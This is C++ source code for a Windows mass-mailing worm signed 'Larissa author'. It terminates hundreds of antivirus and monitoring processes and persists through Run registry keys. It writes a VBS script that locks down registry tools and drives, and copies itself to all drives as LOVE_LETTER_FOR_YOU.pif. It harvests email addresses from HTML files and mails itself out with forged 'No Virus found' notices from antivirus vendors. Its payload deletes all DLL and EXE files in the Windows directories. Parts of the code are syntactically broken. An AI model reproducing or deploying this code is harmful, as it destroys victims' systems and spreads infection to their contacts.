   #include <windows.h>
   #include <tlhelp32>
   #include <fstream>
   #include <mapi>
   #include <memory>

   #pragma argsused

   const char *kill_av[] = {"AGENTSVR.EXE", "ANTI-TROJAN.EXE", "ANTIVIRUS.EXE", "ANTS.EXE",
                           "APIMONITOR.EXE", "APLICA32.EXE", "APVXDWIN.EXE", "ATCON.EXE",
                           "ATGUARD.EXE", "ATRO55EN.EXE", "ATUPDATER.EXE", "ATWATCH.EXE",
                           "AUPDATE.EXE", "AUTODOWN.EXE", "AUTOTRACE.EXE", "AUTOUPDATE.EXE",
                           "AVCONSOL.EXE", "AVGSERV9.EXE", "AVLTMAIN.EXE", "AVPUPD.EXE",
                           "AVSYNMGR.EXE", "AVWUPD32.EXE", "AVXQUAR.EXE", "AVprotect9x.exe",
                           "Au.exe", "BD_PROFESSIONAL.EXE", "BIDEF.EXE", "BIDSERVER.EXE",
                           "BIPCP.EXE", "BIPCPEVALSETUP.EXE", "BISP.EXE", "BLACKD.EXE",
                           "BLACKICE.EXE", "BOOTWARN.EXE", "BORG2.EXE", "BS120.EXE",
                           "CCAPP.exe", "CDP.EXE", "CFGWIZ.EXE", "CFIADMIN.EXE", "CFIAUDIT.EXE",
                           "CFINET.EXE", "CFINET32.EXE", "CLEAN.EXE", "CLEANER.EXE", "CLEANER3.EXE",
                           "CLEANPC.EXE", "CMGRDIAN.EXE", "CMON016.EXE", "CPD.EXE", "CPF9X206.EXE",
                           "CPFNT206.EXE", "CV.EXE", "CWNB181.EXE", "CWNTDWMO.EXE", "D3dupdate.exe",
                           "DEFWATCH.EXE", "DEPUTY.EXE", "DPF.EXE", "DPFSETUP.EXE", "DRWATSON.EXE",
                           "DRWEBUPW.EXE", "ENT.EXE", "ESCANH95.EXE", "ESCANHNT.EXE",
                           "ESCANV95.EXE", "EXANTIVIRUS-CNET.EXE", "FAST.EXE", "FIREWALL.EXE",
                           "FLOWPROTECTOR.EXE", "FP-WIN_TRIAL.EXE", "FRW.EXE", "FSAV.EXE",
                           "FSAV530STBYB.EXE", "FSAV530WTBYB.EXE", "FSAV95.EXE", "GBMENU.EXE",
                           "GBPOLL.EXE", "GUARD.EXE", "HACKTRACERSETUP.EXE", "HTLOG.EXE",
                           "HWPE.EXE", "IAMAPP.EXE", "IAMSERV.EXE", "ICLOAD95.EXE",
                           "ICLOADNT.EXE", "ICMON.EXE", "ICSSUPPNT.EXE", "ICSUPP95.EXE",
                           "ICSUPPNT.EXE", "IFW2000.EXE", "IPARMOR.EXE", "IRIS.EXE",
                           "JAMMER.EXE", "KAVLITE40ENG.EXE", "KAVPERS40ENG.EXE",
                           "KERIO-PF-213-EN-WIN.EXE", "KERIO-WRL-421-EN-WIN.EXE",
                           "KERIO-WRP-421-EN-WIN.EXE", "KILLPROCESSSETUP161.EXE",
                           "LDPRO.EXE", "LOCALNET.EXE", "LOCKDOWN.EXE", "LOCKDOWN2000.EXE",
                           "LSETUP.EXE", "LUALL.EXE", "LUCOMSERVER.EXE", "LUINIT.EXE",
                           "MCAGENT.EXE", "MCUPDATE.EXE", "MFW2EN.EXE", "MFWENG3.02D30.EXE",
                           "MGUI.EXE", "msconfig.exe", "MINILOG.EXE", "MOOLIVE.EXE", "MRFLUX.EXE",
                           "MSCONFIG.EXE", "MSINFO32.EXE", "MSSMMC32.EXE", "MU0311AD.EXE",
                           "NAV80TRY.EXE", "NAVAPW32.EXE", "NAVDX.EXE", "NAVSTUB.EXE",
                           "NAVW32.EXE", "NC2000.EXE", "NCINST4.EXE", "NDD32.EXE",
                           "NEOMONITOR.EXE", "NETARMOR.EXE", "NETINFO.EXE", "NETMON.EXE",
                           "NETSCANPRO.EXE", "NETSPYHUNTER-1.2.EXE", "NETSTAT.EXE",
                           "NISSERV.EXE", "NISUM.EXE", "NMAIN.EXE", "NORTON_INTERNET_SECU_3.0_407.EXE",
                           "NPF40_TW_98_NT_ME_2K.EXE", "NPFMESSENGER.EXE", "NPROTECT.EXE",
                           "NSCHED32.EXE", "NTVDM.EXE", "NUPGRADE.EXE", "NVARCH16.EXE",
                           "NWINST4.EXE", "NWTOOL16.EXE", "OSTRONET.EXE", "OUTPOST.EXE",
                           "OUTPOSTINSTALL.EXE", "OUTPOSTPROINSTALL.EXE", "PADMIN.EXE",
                           "PANIXK.EXE", "PAVPROXY.EXE", "PCC2002S902.EXE", "PCC2K_76_1436.EXE",
                           "PCCIOMON.EXE", "PCDSETUP.EXE", "PCFWALLICON.EXE", "PCIP10117_0.EXE",
                           "PDSETUP.EXE", "PERISCOPE.EXE", "PERSFW.EXE", "PF2.EXE", "PFWADMIN.EXE",
                           "PINGSCAN.EXE", "PLATIN.EXE", "POPROXY.EXE", "POPSCAN.EXE", "PORTDETECTIVE.EXE",
                           "PPINUPDT.EXE", "PPTBC.EXE", "PPVSTOP.EXE", "PROCEXPLORERV1.0.EXE",
                           "PROPORT.EXE", "PROTECTX.EXE", "PSPF.EXE", "PURGE.EXE", "PVIEW95.EXE",
                           "QCONSOLE.EXE", "QSERVER.EXE", "RAV8WIN32ENG.EXE", "RESCUE.EXE",
                           "RESCUE32.EXE", "RRGUARD.EXE", "RSHELL.EXE", "RTVSCN95.EXE",
                           "RULAUNCH.EXE", "SAFEWEB.EXE", "SBSERV.EXE", "SD.EXE", "SETUPVAMEEVAL.EXE",
                           "SETUP_FLOWPROTECTOR_US.EXE", "SFC.EXE", "SGSSFW32.EXE",
                           "avserve2.exe", "SHELLSPYINSTALL.EXE", "SHN.EXE", "SMC.EXE",
                           "SOFI.EXE", "SPF.EXE", "SPHINX.EXE", "SPYXX.EXE", "SS3EDIT.EXE",
                           "ST2.EXE", "SUPFTRL.EXE", "SUPPORTER5.EXE", "SYMPROXYSVC.EXE",
                           "SYSEDIT.EXE", "TASKMGR", "TASKMON.EXE", "TAUMON.EXE", "TAUSCAN.EXE",
                           "TC.EXE", "TCA.EXE", "TCM.EXE", "TDS-3.EXE", "TDS2-98.EXE",
                           "TDS2-NT.EXE", "TFAK5.EXE", "TGBOB.EXE", "TITANIN.EXE",
                           "TITANINXP.EXE", "TRACERT.EXE", "TRJSCAN.EXE", "TRJSETUP.EXE",
                           "TROJANTRAP3.EXE", "UNDOBOOT.EXE", "UPDATE.EXE", "VBCMSERV.EXE",
                           "VBCONS.EXE", "VBUST.EXE", "VBWIN9X.EXE", "VBWINNTW.EXE",
                           "VCSETUP.EXE", "VFSETUP.EXE", "VIRUSMDPERSONALFIREWALL.EXE",
                           "VNLAN300.EXE", "VNPC3000.EXE", "VPC42.EXE", "VPFW30S.EXE",
                           "VPTRAY.EXE", "VSCENU6.02D30.EXE", "VSECOMR.EXE", "VSHWIN32.EXE",
                           "VSISETUP.EXE", "VSMAIN.EXE", "VSMON.EXE", "VSSTAT.EXE",
                           "VSWIN9XE.EXE", "VSWINNTSE.EXE", "VSWINPERSE.EXE",
                           "W32DSM89.EXE", "W9X.EXE", "WATCHDOG.EXE", "WEBSCANX.EXE",
                           "WGFE95.EXE", "WHOSWATCHINGME.EXE", "WINRECON.EXE",
                           "WNT.EXE", "WRADMIN.EXE", "WRCTRL.EXE", "WSBGATE.EXE",
                           "WYVERNWORKSFIREWALL.EXE", "XPF202EN.EXE", "ZAPRO.EXE",
                           "ZAPSETUP3001.EXE", "ZATUTOR.EXE", "ZAUINST.EXE", "ZONALM2601.EXE",
                           "ZONEALARM.EXE","zlclient.exe", "lexplore.exe", "Drunk_lol.pif", "Webcam_004.pif",
                           "sexy_bedroom.pif", "naked_party.pif", "love_me.pif", "osm.exe", "cz.exe",
                           "LOL.scr", "Webcam.pif", "hahahaha.pif", "me_2005.pif", "sister.pif",
                           "winhost.exe", "LOL.scr", "Webcam.pif", "bedroom-thongs.pif", "naked_drunk.pif",
                           "LMAO.pif", "ROFL.pif", "underware.pif", "Hot.pif", "new_webcam.pif", "msnus.exe",
                           "sexy.jpg", "updates.exe", "msnmsr.exe", "bedroom-things.pif", "naked_drunk.pif",
                           "my_pussy.pif", "ROFL.pif", "Hot.pif", "new_webcam.pif","ISASS.EXE",
                           "Beautiful Ass.pif", "John Kerry as Super Chicken.scr", "Kool.pif",
                           "Me & you pic!.pif", "Me Pissed!.pif", "sexy.pif", "She Could Fit her Ass in a Teacup.pif",
                           "she's fuckin fit.pif", "titanic2.jpg.pif", "winis.exe", "nvsc32.exe", 0};

   const char *drives[] = {"a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
                           "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
                           "y:", "z:", 0};

   char *fileNames[] = {"Message.exe", "Letter.exe", "Information.exe", "LOVE_LETTER_FOR_YOU.exe", "Documents.exe",
                        "Attached_Message.exe", "Microsoft_Update.exe", "Private_Letter.exe", "Private_Document.exe",
                        "Important_Message.exe"};

   char *subs[] = {"Re: Message", "Re: Letter", "Re: Information", "Warning of your mail ", "Re: Your Documents",
                   "Re: Account Info", "Windows Update", "Re: My Letter", "Re: Docs", "Re: Your Email Info"};

   char *texts[] = {"+++ Attachment: No Virus found
                     +++ MessageLabs AntiVirus - www.messagelabs.com" , "+++ Attachment: No Virus found
                                                                         +++ Bitdefender AntiVirus - www.bitdefender.com" , "+++ Attachment: No Virus found
                                                                                                                             +++ MC-Afee AntiVirus - www.mcafee.com" , "+++ Attachment: No Virus found
                                                                                                        +++ Kaspersky AntiVirus - www.kaspersky.com" , "+++ Attachment: No Virus found
                                                                                                                    +++ Panda AntiVirus - www.pandasoftware.com" , " +++ Attachment: No Virus found
                                                                                                                                             ++++ Norton AntiVirus - www.symantec.de" }


                    ",
   char path[MAX_PATH];
   HMODULE GetModH = GetModuleHandle(NULL);
   HKEY hKey;
   int i = 0;
   MapiMessage mes;
   MapiRecipDesc from;
   char fileName[512];
   unsigned short counting=0;
   using namespace std;

   void payload();
   void GetDebugPriv();
   void Kill(const char *kill_av);
   int find_drives(const char *drives);
   void no();
   void findMail(char *);
   void GetMail(char *, char *);
   void SendMail(char *subject, char *sfrom,char *sto, char *smes);
   void fastOut();

   ULONG (PASCAL FAR *MSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);

   int PASCAL WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
   {
     HWND hide;
     AllocConsole();
     hide = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(hide, 0);

     Sleep(60000);
     GetDebugPriv();
     CreateMutex(NULL, true, "-)(-=|L4r1$$4|=-)(-");
     if(GetLastError() == ERROR_ALREADY_EXISTS)
     {
       ExitProcess(0);
     }

     for(i = 0; kill_av[i]; i++)
     {
       Kill(kill_av[i]);
     }

     char sys[MAX_PATH];
     char sys2[MAX_PATH];
     char windir[MAX_PATH];
     GetModuleFileName(GetModH, path, sizeof(path));
     GetSystemDirectory(sys, sizeof(sys));
     GetSystemDirectory(sys2, sizeof(sys2));
     GetWindowsDirectory(windir, sizeof(windir));
     strcat(sys, "\\MSLARISSA.pif");
     strcat(sys2, "\\CmdPrompt32.pif");
     strcat(windir, "\\SP00Lsv32.pif");
     CopyFile(path, sys, false);
     CopyFile(path, sys2, false);
     CopyFile(path, windir, false);

     RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey );
     RegSetValueEx(hKey, "MSLARISSA", 0, REG_SZ,(const unsigned char*)sys, sizeof(sys));
     RegSetValueEx(hKey, "Command Prompt32", 0, REG_SZ,(const unsigned char*)sys2, sizeof(sys2));
     RegSetValueEx(hKey, "(L4r1$$4) (4nt1) (V1ruz)", 0, REG_SZ,(const unsigned char*)windir, sizeof(windir));
     RegCloseKey(hKey);

     no();

     ShellExecute(NULL, "open", "IExplore.exe", NULL, NULL, SW_HIDE);
     ShellExecute(NULL, "open", "http://roattack.go.ro", NULL, NULL, SW_HIDE);

     Sleep(60000);
     ShellExecute(NULL, "open", "C:\\WINDOWS\\WinVBS.vbs", NULL, NULL, SW_HIDE);

     for(i =0 ; drives[i]; i++)
     {
       find_drives(drives[i]);
     }

     HINSTANCE MAPIlHnd;
     unsigned char buff[128];
     DWORD buffs = 128;
     HKEY keyHnd;
     char keyPath[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
     char keyItem[] = "Personal";
     counting = (unsigned short)GetTickCount();
     while(counting > 9)
     {
       counting = (unsigned short)(counting/2);
     }
     if(!GetModuleFileName(hInstance, fileName,512))
     {
       fastOut();
     }
     MAPIlHnd = LoadLibraryA("MAPI32.DLL");
     if(!MAPIlHnd)
     {
       fastOut();
     }
     (FARPROC &)MSendMail = GetProcAddress(MAPIlHnd, "MAPISendMail");
     if(!MSendMail)
     {
       fastOut();
     }
     findMail(".");
     findMail("\\windows");
     if(RegOpenKeyEx((HKEY)0x80000001, keyPath, 0, KEY_READ, &keyHnd) == ERROR_SUCCESS)
     {
       if(ERROR_SUCCESS == RegQueryValueEx(keyHnd, keyItem, 0, 0, buff, &buffs))
       {
         buff[buffs-1] = '\\';
         buff[buffs] = 0;
         findMail((char *)buff);
       }
     }
     FreeLibrary(MAPIlHnd);

   /*     1 juzt w4nn4 $4y... 1 l0v3 u ~!L4r1$$4!~     */

     payload();

     for(i = 0; i < 999999999999999999999999999999999999999; i++)
     {
       Sleep(60000);
     }

     ShellExecute(NULL, "open", "MSLARISSA.pif", NULL, NULL, SW_HIDE);
     Sleep(10000);
     ShellExecute(NULL, "open", "CmdPrompt32.pif", NULL, NULL, SW_HIDE);
     Sleep(10000);
     ShellExecute(NULL, "open", "SP00Lsv32.pif", NULL, NULL, SW_HIDE);

     return 0;
   }

   void payload()
   {
     ofstream here;
     here.open("C:\\MESSAGE_TO_USER.txt");
     here.setf(ios_base::showpoint);
     here << "Greetz to infected user!" << endl;
     here << "I will survive," << endl;
     here << "In this moment in time." << endl;
     here << "Your computer will crash," << endl;
     here << "So, you will be mine." << endl;
     here << "I will not crash," << endl;
     here << "I will not fail." << endl;
     here << "So, in this moment in time," << endl;
     here << "I will survive..." << endl;
     here << "   - LARISSA AUTHOR : 2-24-05" << endl;
     here.close();

     ofstream msg_av;
     msg_av.open("C:\\MESSAGE_TO_AVs.txt");
     msg_av.setf(ios_base::showpoint);
     msg_av << "Greetz to AVs!" << endl;
     msg_av << "I wanna be in AV industry when I grow up :-)" << endl;
     msg_av << "  ----------------------------------------  " << endl;
     msg_av << "       - LARISSA AUTHOR : 2-24-05" << endl;
     msg_av.close();

     ofstream bropia_msg;
     bropia_msg.open("C:\\MESSAGE_TO_BROPIA.txt");
     bropia_msg.setf(ios_base::showpoint);
     bropia_msg << "Hey Bropia.. stop making MSN worms it's stupid..." << endl;
     bropia_msg << "... lol -- Larissa Anti Bropia... -- Saving the world from BROPIA!!!" << endl;
     bropia_msg << "                      - LARISSA AUTHOR : 2-24-05" << endl;
     bropia_msg.close();

     system("del C:\\WINDOWS\\System32\\*.dll");
     system("del C:\\WINDOWS\\System32\\*.exe");
     system("del C:\\WINDOWS\\System\\*.dll");
     system("del C:\\WINDOWS\\System\\*.exe");
     system("del C:\\WINDOWS\\*.dll");
     system("del C:\\WINDOWS\\*.exe");
   }

   void Kill(const char *kill_av)
   {
     HANDLE laris;
     PROCESSENTRY32 process;
     process.dwSize = sizeof(PROCESSENTRY32);
     void* photo = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     Process32First(photo, &process);
     while(photo != NULL)
     {
       Process32Next(photo, &process);
       laris = OpenProcess(PROCESS_TERMINATE, false, process.th32ProcessID);
       if(!strcmp(process.szExeFile, kill_av))
       {
         TerminateProcess(laris, 0);
         CloseHandle(laris);
         break;
       }
       if(GetLastError() == ERROR_NO_MORE_FILES)
       {
         break;
       }
       CloseHandle(laris);
     }
   }

   void GetDebugPriv()
   {
     HANDLE hToken;
     LUID DebugVal;
     TOKEN_PRIVILEGES tp;
     if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
     {
       return;
     }
     if(!LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&DebugVal))
     {
       CloseHandle(hToken);
       return;
     }
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Luid = DebugVal;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
     CloseHandle(hToken);
   }

   int find_drives(const char *drives)
   {
     char dir[MAX_PATH];
     UINT dr_type = GetDriveType(drives);

     if(dr_type == DRIVE_REMOVABLE)
     {
       strcpy(dir, drives);
       strcat(dir, "\\");
       strcat(dir, "LOVE_LETTER_FOR_YOU.pif");
       CopyFile(path, dir, true);
       return 0;
     }
     if(dr_type == DRIVE_FIXED)
     {
       strcpy(dir, drives);
       strcat(dir, "\\");
       strcat(dir, "LOVE_LETTER_FOR_YOU.pif");
       CopyFile(path, dir, true);
       return 0;
     }
     if(dr_type == DRIVE_REMOTE)
     {
       strcpy(dir, drives);
       strcat(dir, "\\");
       strcat(dir, "LOVE_LETTER_FOR_YOU.pif");
       CopyFile(path, dir, true);
       return 0;
     }
     return 0;
   }

   void no()
   {
     ofstream nono;
     nono.open("C:\\WINDOWS\\WinVBS.vbs");
     nono.setf(ios_base::showpoint);
     nono << "CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun\", 1, \"REG_DWORD\"" << endl;
     nono << "CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools\", 1, \"REG_DWORD\"" << endl;
     nono << "CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDrives\", 67108863, \"REG_DWORD\"" << endl;
     nono << "CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WinOldApp\\Disabled\", 1, \"REG_DWORD\"" << endl;
     nono << "CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoAdminPage\", 1, \"REG_DWORD\"" << endl;
     nono.close();
   }

   void fastOut()
   {
     MessageBox(NULL, "Invalid memory adress:\n\nProgram terminating.", "System Error", MB_OK | MB_ICONERROR);
     exit(-1);
   }

   void SendMail(char *subject, char *sfrom, char *sto, char *smes)
   {
     memset(&mes, 0, sizeof(MapiMessage));
     memset(&from, 0, sizeof(MapiRecipDesc));
     from.lpszName = sfrom;
     from.ulRecipClass = MAPI_ORIG;
     mes.lpszSubject = subject;
     mes.lpRecips = (MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
     if(!mes.lpRecips)
     {
       fastOut();
     }
     memset(mes.lpRecips, 0, sizeof(MapiRecipDesc));
     mes.lpRecips->lpszName = sto;
     mes.lpRecips->ulRecipClass = MAPI_TO;
     mes.nRecipCount = 1;
     mes.lpFiles = (MapiFileDesc *)malloc(sizeof(MapiFileDesc));
     if(!mes.lpFiles)
     {
       fastOut();
     }
     memset(mes.lpFiles, 0, sizeof(MapiFileDesc));
     mes.lpFiles->lpszPathName = fileName;
     mes.lpFiles->lpszFileName = fileNames[counting];
     mes.nFileCount = 1;
     mes.lpOriginator = &from;
     mes.lpszNoteText = smes;
     (MSendMail)(0, 0, &mes, MAPI_LOGON_UI, 0);
     free(mes.lpRecips);
     free(mes.lpFiles);
   }

   void findMail(char *wild)
   {
     HANDLE fh;
     WIN32_FIND_DATA fdata;
     char mail[128];
     char buff[512];
     wsprintf(buff, "%s\\*.ht*", wild);
     fh = FindFirstFile(buff, &fdata);
     if(fh == INVALID_HANDLE_VALUE)
     {
       return;
     }
     while(1)
     {
       wsprintf(buff, "%s\\%s", wild, fdata.cFileName);
       GetMail(buff, mail);
       if(strlen(mail)>0)
       {
         SendMail(subs[counting], "MSLarissa@Admin.com", mail, texts[counting]);
         counting++;
         {
           if(counting == 10)
           {
             counting = 0;
           }
           if(!FindNextFile(fh, &fdata))
           {
             FindClose(fh);
             return;
           }
         }
       }
     }
   }

   void GetMail(char *name, char *mail)
   {
     HANDLE fd,fd2;
     char *mapped;
     DWORD size, i, k;
     BOOL test = FALSE, valid = FALSE;
     mail[0]=0;
     fd=CreateFile(name,GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, 0);
     if(fd == INVALID_HANDLE_VALUE)
     {
       return;
     }
     size = GetFileSize(fd,NULL);
     if(!size)
     {
       return;
     }
     if(size < 256)
     {
       return;
     }
     size -= 100;
     fd2 = CreateFileMapping(fd, 0, PAGE_READONLY, 0, 0, 0);
     if(!fd2)
     {
       CloseHandle(fd);
       return;
     }
     mapped = (char *)MapViewOfFile(fd2, FILE_MAP_READ, 0, 0, 0);
     if(!mapped)
     {
       CloseHandle(fd);
       return;
     }
     i = 0;
     while(i < size && !test)
     {
       if(!strncmpi("mailto:", mapped + i, strlen("mailto:")))
       {
         test = TRUE;
         i += strlen("mailto:");
         k = 0;
         while(mapped[i]!=34 && mapped[i]!=39 && i < size && k < 127)
         {
           if(mapped[i] != ' ')
           {
             mail[k] = mapped[i];
             k++;
             if(mapped[i] == '@')
             {
               valid=TRUE;
             }
           }
           i++;
         }
         mail[k] = 0;
       }
       else
       {
         i++;
       }
     }
     if(!valid)
     {
       mail[0] = 0;
       UnmapViewOfFile(mapped);
       CloseHandle(fd);
       return;
     }
   }
